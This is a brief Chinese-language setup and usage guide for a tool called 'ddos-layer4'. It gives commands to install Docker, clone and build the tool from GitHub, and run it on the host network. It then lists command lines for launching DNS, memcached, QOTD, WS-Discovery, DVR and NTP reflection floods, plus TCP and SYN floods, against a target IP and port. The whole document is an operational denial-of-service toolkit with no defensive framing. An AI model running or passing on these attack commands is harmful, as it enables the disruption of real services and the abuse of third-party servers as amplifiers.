### Ubuntu Docker 安装

	apt update -y && apt install curl -y && curl -fsSL https://test.docker.com -o test-docker.sh && sudo sh test-docker.sh

### ddos-layer4安装

	apt install git -y && git clone https://github.com/qq1521575701/ddos-layer4.git && cd ddos-layer4 && docker build -t ddos-layer4 . && docker run -itd --name ddos-layer4 --network host ddos-layer4:latest && rm -rf ~/ddos-layer4


### ddos-layer4容器

	docker exec -it ddos-layer4 /bin/bash

### ddos-layer4使用

	docker exec -it ddos-layer4 ./dns ip port dns.txt 1 -1 60

	docker exec -it ddos-layer4 ./meme ip port meme.txt 1 -1 60

	docker exec -it ddos-layer4 ./qotd ip port qotd.txt 1 -1 60

	docker exec -it ddos-layer4 ./wsd ip port wsd.txt 1 -1 60

	docker exec -it ddos-layer4 ./dvr ip port dvr.txt 1 -1 60

	docker exec -it ddos-layer4 ./ntp ip port ntp.txt 1 -1 60

	docker exec -it ddos-layer4 ./tcp ip port 1 -1 60

 	docker exec -it ddos-layer4 ./syn ip port 1 -1 60 8.128.0.0/10
